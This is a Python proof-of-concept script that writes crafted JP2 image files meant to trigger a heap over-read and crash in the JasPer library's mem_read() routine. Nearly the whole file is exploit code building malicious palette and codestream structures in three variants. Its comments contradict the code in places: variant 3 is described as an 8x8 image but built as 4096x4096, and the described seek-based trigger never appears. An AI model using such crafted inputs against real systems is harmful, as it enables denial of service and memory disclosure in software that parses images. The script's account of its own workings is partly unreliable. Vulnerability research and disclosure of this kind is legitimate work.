#!/usr/bin/env python3
"""
VULN 002 PoC generator: mem_read heap over-read via negative cnt widened to SIZE_MAX.

Vulnerability: mem_read() in jas_stream.c lines 1171-1184.
When m->pos_ > m->len_, n = m->len_ - m->pos_ is negative (int_fast32_t).
Then cnt = JAS_MIN(n, cnt) sets cnt to negative. Then memcpy receives negative
cnt, widened to SIZE_MAX → heap over-read → SIGSEGV.

Strategy:
- Trigger the condition m->pos_ > m->len_ via mem_seek (VULN 001 dead check)
  followed by a read operation on the memory stream.
- The JP2 PCLR+CMAP path calls jas_image_depalettize() which calls
  jas_image_readcmptsample() on the component stream.
- We use valid small codestreams (avoids sample limit) paired with
  PCLR/CMAP boxes.

Three variants (written to separate files, all named vuln_002.jp2 in sequence):

Variant 1: 1x1 grayscale image + PCLR (1 entry, 1 channel) + CMAP (direct/palette)
Variant 2: 100x100 grayscale image + PCLR + CMAP
Variant 3: 8x8 image with truncated codestream to leave stream in bad state

Usage: python3 vuln_002_gen.py [variant]
  variant: 1 (default), 2, or 3
"""

import struct
import sys
import os

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_FILE = os.path.join(SCRIPT_DIR, "vuln_002.jp2")


def u8(v):
    return struct.pack(">B", v & 0xFF)

def u16(v):
    return struct.pack(">H", v & 0xFFFF)

def u32(v):
    return struct.pack(">I", v & 0xFFFFFFFF)

def make_box(box_type_bytes, data):
    total_len = 8 + len(data)
    return struct.pack(">I", total_len) + box_type_bytes + data


# ---------------------------------------------------------------------------
# Pre-built valid 1x1 grayscale JPEG-2000 codestream (verified parses cleanly)
# ---------------------------------------------------------------------------
CODESTREAM_1x1 = bytes.fromhex(
    "ff4fff510029000000000001000000010000000000000000000000010000000100000000000000000001070101"
    "ff640022000143726561746f723a204a61735065722056657273696f6e20322e302e3132"
    "ff52000c00000001000504040001"
    "ff5c00134040484850484850484850484850484850"
    "ff90000a00000000002e0001"
    "ff5d0014004040000000000000000000000000000000"
    "ff93cfb40809978080808080"
    "ffd9"
)


def build_siz_marker(width, height, ncomp=1):
    lsiz = 38 + ncomp * 3
    data = u16(0)          # Rsiz
    data += u32(width)     # Xsiz
    data += u32(height)    # Ysiz
    data += u32(0)         # XOsiz
    data += u32(0)         # YOsiz
    data += u32(width)     # XTsiz
    data += u32(height)    # YTsiz
    data += u32(0)         # XTOsiz
    data += u32(0)         # YTOsiz
    data += u16(ncomp)     # Csiz
    for _ in range(ncomp):
        data += b"\x07"    # Ssiz: 8-bit unsigned
        data += b"\x01"    # XRsiz
        data += b"\x01"    # YRsiz
    return b"\xFF\x51" + u16(lsiz) + data


def build_cod_marker():
    data = u16(12)   # Lcod
    data += b"\x00"  # Scod
    data += b"\x00"  # progression order LRCP
    data += u16(1)   # num layers
    data += b"\x00"  # no MCT
    data += b"\x05"  # num decomp levels
    data += b"\x04"  # xcb-2 = 4 → 64
    data += b"\x04"  # ycb-2 = 4 → 64
    data += b"\x00"  # cblkstyle
    data += b"\x00"  # wavelet: 9-7 irreversible
    return b"\xFF\x52" + data


def build_qcd_marker(nlevels=5):
    # Quantization default: NOQNT (Sqcd bits 4:0 = 00000)
    # Number of step sizes for NOQNT: 3*nlevels - 2 = 13 for nlevels=5
    # Sqcd = 0x20: numguard=1 (001), qntsty=NOQNT (00000)
    sqcd = 0x20
    step = 0x40  # typical step size byte
    num_steps = 3 * nlevels - 2
    data = u16(2 + 1 + num_steps)  # Lqcd
    data += u8(sqcd)
    data += bytes([step] * num_steps)
    return b"\xFF\x5C" + data


def build_sot_marker(tile_idx, psot, tpsot=0, tnsot=1):
    data = u16(10)        # Lsot
    data += u16(tile_idx) # Isot
    data += u32(psot)     # Psot
    data += u8(tpsot)     # TPsot
    data += u8(tnsot)     # TNsot
    return b"\xFF\x90" + data


def build_codestream_small(width, height, ncomp=1, tile_data=None):
    """Build minimal JPEG-2000 codestream with empty/short tile data."""
    soc = b"\xFF\x4F"
    siz = build_siz_marker(width, height, ncomp)
    cod = build_cod_marker()
    qcd = build_qcd_marker()

    if tile_data is None:
        tile_data = b"\x00" * 4  # minimal tile data

    # SOT + SOD + tile data + EOC
    sod = b"\xFF\x93"
    eoc = b"\xFF\xD9"

    psot = 12 + 2 + len(tile_data)  # SOT header (12) + SOD marker (2) + data
    sot = build_sot_marker(0, psot)

    return soc + siz + cod + qcd + sot + sod + tile_data + eoc


def build_jp2_variant1():
    """
    Variant 1: 1x1 grayscale + PCLR + CMAP.
    Uses the known-good 1x1 codestream.
    PCLR: 4 entries, 1 channel (bpc=7 = 8-bit unsigned)
    CMAP: mtyp=1 (palette), pcol=0 (valid), cmp=0
    This triggers the depalettize read path on the 1x1 component stream.
    """
    sig = make_box(b"jP  ", b"\x0D\x0A\x87\x0A")
    ftyp = make_box(b"ftyp", b"jp2 " + u32(0) + b"jp2 ")

    ihdr = make_box(b"ihdr",
        u32(1) + u32(1) + u16(1) + u8(7) + u8(7) + u8(0) + u8(0))
    colr = make_box(b"colr", u8(1) + u8(0) + u8(0) + u32(17))

    # PCLR: NE=4, NPC=1, btyp[0]=7 (8-bit unsigned), lutdata[4]
    pclr = make_box(b"pclr",
        u16(4) + u8(1) + u8(7) + bytes([0x00, 0x40, 0x80, 0xFF]))

    # CMAP: 1 channel, cmp=0, mtyp=1 (JP2_CMAP_PALETTE), pcol=0
    cmap = make_box(b"cmap", u16(0) + u8(1) + u8(0))

    jp2h = make_box(b"jp2h", ihdr + colr + pclr + cmap)

    # Use the validated 1x1 codestream
    jp2c = struct.pack(">I", 0) + b"jp2c" + CODESTREAM_1x1

    return sig + ftyp + jp2h + jp2c


def build_jp2_variant2():
    """
    Variant 2: 100x100 grayscale + PCLR + CMAP.
    Larger image to increase memory stream size and seek offsets.
    Component stream will be 100*100*1 = 10000 bytes.
    Uses a short tile data that forces early EOF in tile decode,
    potentially leaving component stream partially initialized.
    """
    sig = make_box(b"jP  ", b"\x0D\x0A\x87\x0A")
    ftyp = make_box(b"ftyp", b"jp2 " + u32(0) + b"jp2 ")

    ihdr = make_box(b"ihdr",
        u32(100) + u32(100) + u16(1) + u8(7) + u8(7) + u8(0) + u8(0))
    colr = make_box(b"colr", u8(1) + u8(0) + u8(0) + u32(17))

    # PCLR: NE=256, NPC=1, btyp[0]=7 (8-bit unsigned), lutdata[256]
    lut_data = bytes(range(256))
    pclr = make_box(b"pclr", u16(256) + u8(1) + u8(7) + lut_data)

    # CMAP: 1 channel, cmp=0, mtyp=1 (palette), pcol=0
    cmap = make_box(b"cmap", u16(0) + u8(1) + u8(0))

    jp2h = make_box(b"jp2h", ihdr + colr + pclr + cmap)

    # Build 100x100 codestream with minimal tile data
    cs = build_codestream_small(100, 100, 1, tile_data=b"\x00" * 50)
    jp2c = make_box(b"jp2c", cs)

    return sig + ftyp + jp2h + jp2c


def build_jp2_variant3():
    """
    Variant 3: Large-ish image (4096x4096) with PCLR+CMAP.
    Component stream = 4096*4096*1 = 16MB (in-memory, < 256MB threshold).
    The depalettize path reads from this stream after JPC decode.
    With many pixels to read, the seek and read pattern exercises mem_read.
    Also: use imginfo -o max_samples=0 in the run script to bypass sample limit
    (4096*4096 = 16M < 67M limit, so no bypass needed here).
    """
    sig = make_box(b"jP  ", b"\x0D\x0A\x87\x0A")
    ftyp = make_box(b"ftyp", b"jp2 " + u32(0) + b"jp2 ")

    w, h = 4096, 4096
    ihdr = make_box(b"ihdr",
        u32(h) + u32(w) + u16(1) + u8(7) + u8(7) + u8(0) + u8(0))
    colr = make_box(b"colr", u8(1) + u8(0) + u8(0) + u32(17))

    # PCLR: NE=256, NPC=1
    lut_data = bytes(range(256))
    pclr = make_box(b"pclr", u16(256) + u8(1) + u8(7) + lut_data)

    # CMAP: palette mapping, pcol=0
    cmap = make_box(b"cmap", u16(0) + u8(1) + u8(0))

    jp2h = make_box(b"jp2h", ihdr + colr + pclr + cmap)

    # Codestream for 4096x4096 - truncated tile data forces early tile end
    cs = build_codestream_small(w, h, 1, tile_data=b"\x00" * 100)
    jp2c = make_box(b"jp2c", cs)

    return sig + ftyp + jp2h + jp2c


if __name__ == "__main__":
    variant = sys.argv[1] if len(sys.argv) > 1 else "1"

    if variant == "1":
        data = build_jp2_variant1()
        print(f"[+] Variant 1: 1x1 + PCLR/CMAP (known-good codestream)")
    elif variant == "2":
        data = build_jp2_variant2()
        print(f"[+] Variant 2: 100x100 + PCLR/CMAP (short tile data)")
    elif variant == "3":
        data = build_jp2_variant3()
        print(f"[+] Variant 3: 4096x4096 + PCLR/CMAP (minimal tile data)")
    else:
        print(f"Unknown variant: {variant}", file=sys.stderr)
        sys.exit(1)

    with open(OUTPUT_FILE, "wb") as f:
        f.write(data)
    print(f"[+] Written {len(data)} bytes to {OUTPUT_FILE}")
